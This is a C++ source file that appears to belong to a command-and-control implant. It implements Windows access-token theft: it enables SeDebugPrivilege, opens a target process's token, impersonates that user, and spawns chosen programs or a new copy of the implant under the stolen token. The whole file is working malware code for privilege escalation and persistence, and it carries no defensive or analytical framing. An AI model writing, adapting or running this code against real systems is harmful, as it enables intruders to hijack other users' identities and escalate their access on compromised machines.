#include "core/task.hpp"

namespace Task::Helper::Token
{
    BOOL CreateProcessWithStolenToken(Procs::PPROCS pProcs, HANDLE hToken, LPCWSTR appName)
    {
        HANDLE hDuplToken = NULL;
        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        BOOL bResults = FALSE;

        RtlZeroMemory(&si, sizeof(STARTUPINFOW));
        RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        si.cb = sizeof(STARTUPINFOW);

        bResults = pProcs->lpDuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            &hDuplToken
        );
        if (!bResults)
        {
            return FALSE;
        }

        bResults = pProcs->lpCreateProcessWithTokenW(
            hDuplToken,
            LOGON_WITH_PROFILE,
            appName,
            NULL,
            0,
            NULL,
            NULL,
            &si,
            &pi
        );
        if (!bResults)
        {
            return FALSE;
        }

        return TRUE;
    }
}

namespace Task
{
    std::wstring TokenRevert(State::PSTATE pState)
    {
        if (!pState->pProcs->lpRevertToSelf())
        {
            return L"Error: Could not revert impersonation.";
        }

        return L"Success: Reverted impersonation successfully.";
    }

    // NTAPI not working, so use WINAPIs
    std::wstring TokenSteal(
        State::PSTATE pState,
        const std::wstring& wPid,
        const std::wstring& wProcName,
        bool bLogin
    ) {
        HANDLE hCurrToken = nullptr;
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        // Current user needs to have SeDebugPrivilege.
        if (!pState->pProcs->lpOpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrToken))
        {
            return L"Error: Could not open the process token.";
        }
        if (!System::Priv::PrivilegeCheck(pState->pProcs, hCurrToken, SE_DEBUG_NAME))
        {
            if (!System::Priv::PrivilegeSet(pState->pProcs, hCurrToken, SE_DEBUG_NAME, TRUE))
            {
                return L"Error: Could not set SeDebugPrivilege to current process.";
            }
        }

        // Open target process token handle.
        HANDLE hProcess = pState->pProcs->lpOpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, dwPid);
        if (!hProcess)
        {
            return L"Error: Failed to get target process handle.";
        }

        HANDLE hToken = NULL;
        if (!pState->pProcs->lpOpenProcessToken(hProcess, MAXIMUM_ALLOWED, &hToken))
        {
            return L"Error: Failed to get target process token handle.";
        }

        if (bLogin)
        {
            if (!pState->pProcs->lpImpersonateLoggedOnUser(hToken))
            {
                return L"Error: Could not logon with impersonation.";
            }
        }
        else if (wProcName != L"")
        {
            if (!Task::Helper::Token::CreateProcessWithStolenToken(pState->pProcs, hToken, wProcName.c_str()))
            {
                return L"Error: Could not create a process with stolen token.";
            }
        }
        else
        {
            // Start another implant process.

            // Get current program (implant) path.
            WCHAR wSelfPath[MAX_PATH];
            DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
            if (dwResult == 0)
            {
                return L"Error: Failed to get the program path.";
            }
            
            if (!Task::Helper::Token::CreateProcessWithStolenToken(pState->pProcs, hToken, wSelfPath))
            {
                return L"Error: Failed to create another implant process.";
            }
        }

        return L"Success: Token has been stolen successfully.";
    }
}